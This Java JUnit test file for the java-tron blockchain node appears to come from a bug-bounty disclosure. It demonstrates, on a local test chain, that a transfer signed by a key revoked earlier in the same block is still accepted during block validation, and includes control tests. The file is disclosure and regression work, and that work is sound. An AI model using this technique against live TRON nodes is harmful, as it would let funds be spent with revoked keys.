package org.tron.core.db;

import com.google.protobuf.ByteString;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.Set;
import java.util.concurrent.atomic.AtomicInteger;
import org.junit.Assert;
import org.junit.Test;
import org.tron.common.BaseMethodTest;
import org.tron.common.crypto.ECKey;
import org.tron.common.utils.ByteArray;
import org.tron.common.utils.LocalWitnesses;
import org.tron.common.utils.Sha256Hash;
import org.tron.consensus.dpos.DposSlot;
import org.tron.core.capsule.AccountCapsule;
import org.tron.core.capsule.BlockCapsule;
import org.tron.core.capsule.TransactionCapsule;
import org.tron.core.capsule.WitnessCapsule;
import org.tron.core.config.args.Args;
import org.tron.core.consensus.ConsensusService;
import org.tron.core.exception.ValidateSignatureException;
import org.tron.protos.Protocol.Account;
import org.tron.protos.Protocol.Key;
import org.tron.protos.Protocol.Permission;
import org.tron.protos.Protocol.Transaction.Contract.ContractType;
import org.tron.protos.contract.AccountContract.AccountPermissionUpdateContract;
import org.tron.protos.contract.BalanceContract.TransferContract;

/**
 * S-1 regression / proof-of-concept test (TRON DAO hunt, 2026-10-30).
 *
 * <p>Shape: a permission change that revokes a key does NOT invalidate a later
 * transaction in the SAME block on the block-validation path
 * ({@code Manager.pushBlock -> processBlock}), even though the identical pair
 * split across two blocks is rejected.
 *
 * <p>Mechanism at java-tron master b33eed89:
 * <ol>
 *   <li>{@code TransactionCapsule.validateSignature} is memoized per capsule
 *       (chainbase TransactionCapsule.java:698-719): once {@code isVerified}
 *       is set, no later call re-checks the signature against newer account
 *       state.</li>
 *   <li>{@code Manager.processBlock} batch-verifies signatures
 *       ({@code preValidateTransactionSign}) against PRE-block state, before
 *       any transaction of the block is applied.</li>
 *   <li>The sequential apply loop ({@code processTransaction}) calls
 *       {@code validateSignature} again, but it returns immediately on the
 *       memoized flag. Nothing in the apply loop re-verifies transactions
 *       whose owner's permissions were changed by an earlier transaction in
 *       the same block. ({@code ownerAddressSet} is updated at
 *       Manager.java:1601 but is bookkeeping only on this path.)</li>
 * </ol>
 *
 * <p>The team's own fixes cover the sibling paths: generation-side reset in
 * {@code generateBlock}, fork-switch flush in {@code switchFork}, re-push
 * reset (PR #6716), and {@code getVerifyTxs} seeding from
 * {@code ownerAddressSet} for the cross-block case (PR #6796). The same-block
 * case on the validation path is not covered by any of them.
 *
 * <p>Expected results at vulnerable HEAD (b33eed89):
 * <ul>
 *   <li>{@link #sameBlockRevocationDoesNotInvalidateLaterSpend()} PASSES:
 *       the block [revocation R, spend S signed by the key R revokes] is
 *       accepted and S executes. After a correct fix this test must FAIL
 *       (pushBlock must throw ValidateSignatureException).</li>
 *   <li>{@link #crossBlockRevocationInvalidatesSpend()} PASSES: the same
 *       pair split across two blocks is rejected.</li>
 *   <li>{@link #crossBlockPooledSpendRejectedAfter6796()} PASSES: PR #6796's
 *       own scenario (spend pooled pre-verified, permission change already
 *       consumed, ownerAddressSet still carrying the owner) is rejected when
 *       driven through the full processBlock path.</li>
 * </ul>
 */
public class ManagerSameBlockRevocationTest extends BaseMethodTest {

  // Deterministic test keys (throwaway, local test chain only).
  private static final String OLD_KEY_HEX =
      "1111111111111111111111111111111111111111111111111111111111111111";
  private static final String NEW_KEY_HEX =
      "2222222222222222222222222222222222222222222222222222222222222222";
  private static final String WITNESS_KEY_HEX =
      "3333333333333333333333333333333333333333333333333333333333333333";

  private static final byte[] OLD_KEY = ByteArray.fromHexString(OLD_KEY_HEX);
  private static final byte[] NEW_KEY = ByteArray.fromHexString(NEW_KEY_HEX);
  private static final byte[] OLD_ADDRESS = ECKey.fromPrivate(OLD_KEY).getAddress();
  private static final byte[] NEW_ADDRESS = ECKey.fromPrivate(NEW_KEY).getAddress();
  private static final byte[] WITNESS_ADDRESS =
      ECKey.fromPrivate(ByteArray.fromHexString(WITNESS_KEY_HEX)).getAddress();

  // Multisig-style victim account: its address is independent of its keys.
  private static final byte[] VICTIM =
      ByteArray.fromHexString("410000000000000000000000000000000000000001");
  private static final byte[] RECIPIENT =
      ByteArray.fromHexString("410000000000000000000000000000000000000002");

  private static final long INITIAL_BALANCE = 100_000_000_000L; // 100,000 TRX
  private static final long AMOUNT = 1_000_000L; // 1 TRX

  private static final AtomicInteger PORT = new AtomicInteger(0);

  private DposSlot dposSlot;
  private ConsensusService consensusService;
  private LocalWitnesses localWitnesses;

  @Override
  protected void afterInit() {
    Args.getInstance().setNodeListenPort(13000 + PORT.incrementAndGet());
    BlockGenerate.setManager(dbManager);
    dposSlot = context.getBean(DposSlot.class);
    consensusService = context.getBean(ConsensusService.class);
    consensusService.start();

    localWitnesses = new LocalWitnesses();
    localWitnesses.setPrivateKeys(Arrays.asList(WITNESS_KEY_HEX));
    localWitnesses.initWitnessAccountAddress(null, true);
    Args.setLocalWitnesses(localWitnesses);

    installWitness();
  }

  /** Installs the fixed-key witness as the only active witness (ManagerTest pattern). */
  private void installWitness() {
    chainBaseManager.getWitnesses().clear();
    ByteString address = ByteString.copyFrom(WITNESS_ADDRESS);
    WitnessCapsule witnessCapsule = new WitnessCapsule(address);
    chainBaseManager.getWitnessStore().put(WITNESS_ADDRESS, witnessCapsule);
    chainBaseManager.addWitness(address);
    AccountCapsule accountCapsule =
        new AccountCapsule(Account.newBuilder().setAddress(address).build());
    chainBaseManager.getAccountStore().put(WITNESS_ADDRESS, accountCapsule);
  }

  /** Victim account whose owner + active permissions are held solely by OLD_KEY. */
  private void setupVictim() {
    chainBaseManager.getDynamicPropertiesStore().saveAllowMultiSign(1);
    chainBaseManager.getDynamicPropertiesStore().saveTotalSignNum(5);

    ByteString victim = ByteString.copyFrom(VICTIM);
    Account account = Account.newBuilder()
        .setAddress(victim)
        .setBalance(INITIAL_BALANCE)
        .setCreateTime(1533529945000L)
        .setOwnerPermission(permissionWithKey(
            AccountCapsule.createDefaultOwnerPermission(victim), OLD_ADDRESS))
        .addActivePermission(permissionWithKey(
            AccountCapsule.createDefaultActivePermission(victim,
                chainBaseManager.getDynamicPropertiesStore()), OLD_ADDRESS))
        .build();
    chainBaseManager.getAccountStore().put(VICTIM, new AccountCapsule(account));

    Account recipient = Account.newBuilder()
        .setAddress(ByteString.copyFrom(RECIPIENT))
        .setBalance(0)
        .setCreateTime(1533529945000L)
        .build();
    chainBaseManager.getAccountStore().put(RECIPIENT, new AccountCapsule(recipient));

    // Setup sanity: the victim is controlled by the old key only.
    Assert.assertTrue(permissionContains(currentOwnerPermission(), OLD_ADDRESS));
    Assert.assertFalse(permissionContains(currentOwnerPermission(), NEW_ADDRESS));
  }

  private Permission permissionWithKey(Permission base, byte[] keyAddress) {
    return base.toBuilder().clearKeys()
        .addKeys(Key.newBuilder()
            .setAddress(ByteString.copyFrom(keyAddress)).setWeight(1).build())
        .build();
  }

  private boolean permissionContains(Permission permission, byte[] address) {
    ByteString target = ByteString.copyFrom(address);
    return permission.getKeysList().stream()
        .anyMatch(key -> key.getAddress().equals(target));
  }

  private Permission currentOwnerPermission() {
    return chainBaseManager.getAccountStore().getUnchecked(VICTIM).getPermissionById(0);
  }

  private long recipientBalance() {
    return chainBaseManager.getAccountStore().getUnchecked(RECIPIENT).getBalance();
  }

  private long headTime() {
    return chainBaseManager.getDynamicPropertiesStore().getLatestBlockHeaderTimestamp();
  }

  private long headNum() {
    return chainBaseManager.getDynamicPropertiesStore().getLatestBlockHeaderNumber();
  }

  /** Sets tapos reference + expiration; must be called before signing. */
  private void prepare(TransactionCapsule tx) {
    chainBaseManager.setBlockReference(tx);
    tx.setExpiration(headTime() + 3600_000L);
  }

  /** R: rotate the victim's owner + active permissions from OLD_KEY to NEW_KEY. */
  private TransactionCapsule buildRevocation() {
    ByteString victim = ByteString.copyFrom(VICTIM);
    AccountPermissionUpdateContract contract = AccountPermissionUpdateContract.newBuilder()
        .setOwnerAddress(victim)
        .setOwner(permissionWithKey(
            AccountCapsule.createDefaultOwnerPermission(victim), NEW_ADDRESS))
        .addActives(permissionWithKey(
            AccountCapsule.createDefaultActivePermission(victim,
                chainBaseManager.getDynamicPropertiesStore()), NEW_ADDRESS))
        .build();
    TransactionCapsule tx =
        new TransactionCapsule(contract, ContractType.AccountPermissionUpdateContract);
    prepare(tx);
    tx.sign(OLD_KEY); // rotation authorized by the current (old) key
    return tx;
  }

  /** S: a plain transfer out of the victim account, signed by OLD_KEY only. */
  private TransactionCapsule buildSpend() {
    TransferContract contract = TransferContract.newBuilder()
        .setOwnerAddress(ByteString.copyFrom(VICTIM))
        .setToAddress(ByteString.copyFrom(RECIPIENT))
        .setAmount(AMOUNT)
        .build();
    TransactionCapsule tx = new TransactionCapsule(contract, ContractType.TransferContract);
    prepare(tx);
    tx.sign(OLD_KEY);
    return tx;
  }

  /** Builds a received (NOT self-generated) block: the validation path is exercised. */
  private BlockCapsule buildBlock(long time, TransactionCapsule... txs) {
    ByteString witness = dposSlot.getScheduledWitness(dposSlot.getSlot(time));
    Assert.assertEquals("the test witness must be the scheduled witness",
        ByteString.copyFrom(WITNESS_ADDRESS), witness);
    Sha256Hash parent =
        chainBaseManager.getDynamicPropertiesStore().getLatestBlockHeaderHash();
    BlockCapsule block = new BlockCapsule(headNum() + 1, parent, time, witness);
    for (TransactionCapsule tx : txs) {
      // a fresh capsule per block entry, as a receiving node builds from the wire
      block.addTransaction(new TransactionCapsule(tx.getInstance()));
    }
    block.setMerkleRoot();
    block.sign(ByteArray.fromHexString(WITNESS_KEY_HEX));
    Assert.assertFalse(block.generatedByMyself);
    return block;
  }

  /**
   * THE BUG (test passes at vulnerable HEAD): one block contains, in order,
   * [R = permission update revoking OLD_KEY, S = transfer signed by OLD_KEY].
   * Both were broadcast and sit in this node's pending pool. Validation must
   * reject S once R is applied earlier in the same block; at HEAD it accepts
   * and executes S.
   */
  @Test
  public void sameBlockRevocationDoesNotInvalidateLaterSpend() throws Exception {
    setupVictim();
    TransactionCapsule revocation = buildRevocation();
    TransactionCapsule spend = buildSpend();

    // Both transactions were broadcast and are in this node's pending pool.
    // (The pool copy of R is what seeds getVerifyTxs' multiAddresses with the
    // victim, so S is batch-verified -- against pre-block state -- and the
    // memoized result is then trusted by the apply loop.)
    dbManager.getPendingTransactions()
        .add(new TransactionCapsule(revocation.getInstance()));
    dbManager.getPendingTransactions()
        .add(new TransactionCapsule(spend.getInstance()));

    BlockCapsule block = buildBlock(headTime() + 3000, revocation, spend);

    // Validation path: pushBlock -> processBlock. At HEAD this does NOT throw.
    dbManager.pushBlock(block);

    // R was applied: the victim's owner permission now holds the NEW key only.
    Assert.assertTrue(permissionContains(currentOwnerPermission(), NEW_ADDRESS));
    Assert.assertFalse(permissionContains(currentOwnerPermission(), OLD_ADDRESS));

    // Yet S, signed solely by the key R just revoked, executed in the same block.
    Assert.assertEquals(1, headNum());
    Assert.assertEquals(AMOUNT, recipientBalance());
    Assert.assertTrue(chainBaseManager.getAccountStore().getUnchecked(VICTIM).getBalance()
        < INITIAL_BALANCE);
    System.out.println("=== S-1 CONFIRMED: a spend signed by a key revoked earlier "
        + "in the SAME block was accepted and executed on the validation path. "
        + "Recipient balance = " + recipientBalance() + " sun. ===");
  }

  /**
   * CONTROL A (organic, full path): the same pair split across two blocks.
   * Once R is committed in block 1, S in block 2 is batch-verified against
   * post-revocation state and the block is rejected.
   */
  @Test
  public void crossBlockRevocationInvalidatesSpend() throws Exception {
    setupVictim();
    TransactionCapsule revocation = buildRevocation();
    dbManager.pushBlock(buildBlock(headTime() + 3000, revocation));
    Assert.assertTrue(permissionContains(currentOwnerPermission(), NEW_ADDRESS));
    Assert.assertEquals(1, headNum());

    TransactionCapsule spend = buildSpend(); // signed by the now-revoked OLD_KEY
    try {
      dbManager.pushBlock(buildBlock(headTime() + 3000, spend));
      Assert.fail("spend signed by a revoked key must be rejected in a later block");
    } catch (ValidateSignatureException e) {
      // expected: batch verification in processBlock sees post-revocation state
      System.out.println("=== CONTROL A OK: cross-block spend rejected: "
          + e.getMessage() + " ===");
    }
    Assert.assertEquals(1, headNum());
    Assert.assertEquals(0, recipientBalance());
  }

  /**
   * CONTROL B (PR #6796's own regression scenario, driven through the full
   * processBlock path instead of only getVerifyTxs): the permission change
   * was consumed in an earlier block, ownerAddressSet still carries the
   * victim (seeded exactly as the upstream #6796 test seeds it), and the
   * spend sits in the pending pool pre-verified. Post-#6796, getVerifyTxs
   * forces re-verification and the block is rejected.
   */
  @Test
  public void crossBlockPooledSpendRejectedAfter6796() throws Exception {
    setupVictim();
    TransactionCapsule revocation = buildRevocation();
    // S was created and broadcast BEFORE the revocation landed (old reference,
    // signed by OLD_KEY while it was still authorized).
    TransactionCapsule spend = buildSpend();

    dbManager.pushBlock(buildBlock(headTime() + 3000, revocation));
    Assert.assertTrue(permissionContains(currentOwnerPermission(), NEW_ADDRESS));

    // Simulate the post-consumption state PR #6796 addresses: the consumed
    // permission-change left the victim in ownerAddressSet (same reflection
    // seeding the upstream regression test uses).
    Field field = Manager.class.getDeclaredField("ownerAddressSet");
    field.setAccessible(true);
    @SuppressWarnings("unchecked")
    Set<String> ownerAddressSet = (Set<String>) field.get(dbManager);
    ownerAddressSet.add(ByteArray.toHexString(VICTIM));

    TransactionCapsule pooled = new TransactionCapsule(spend.getInstance());
    pooled.setVerified(true); // entered the pool pre-verified, as in #6796's scenario
    dbManager.getPendingTransactions().add(pooled);

    try {
      dbManager.pushBlock(buildBlock(headTime() + 3000, spend));
      Assert.fail("post-#6796, the pooled spend must be re-verified and rejected");
    } catch (ValidateSignatureException e) {
      System.out.println("=== CONTROL B OK: pooled cross-block spend rejected: "
          + e.getMessage() + " ===");
    }
    Assert.assertEquals(1, headNum());
    Assert.assertEquals(0, recipientBalance());
  }
}
